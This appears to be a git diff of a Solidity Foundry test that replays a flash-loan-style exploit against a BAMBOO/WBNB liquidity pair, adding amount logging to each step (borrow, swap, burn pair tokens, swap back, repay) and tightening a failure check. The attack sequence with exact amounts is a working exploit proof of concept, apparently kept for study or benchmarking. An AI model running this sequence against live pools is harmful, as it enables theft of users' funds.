@@ -203,20 +203,33 @@ contract BambooTestBase is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
+        emit log_named_uint("amt0", 4000 ether);
         borrow_wbnb_owner(4000 ether);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 155890849999929463804);
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(155890849999929463804, address(wbnb))
+        );
         swap_pair_attacker_wbnb_bamboo(
             155890849999929463804,
             pair.getAmountOut(155890849999929463804, address(wbnb))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 54033870967101818317);
         burn_bamboo_pair(54033870967101818317);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", bamboo.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))
+        );
         swap_pair_attacker_bamboo_wbnb(
             bamboo.balanceOf(attacker),
             pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 4000 ether);
         payback_wbnb_owner(4000 ether);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -241,7 +254,7 @@ contract BambooTestBase is Test, BlockLoader {
         burn_bamboo_pair(amt3);
         swap_pair_attacker_bamboo_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
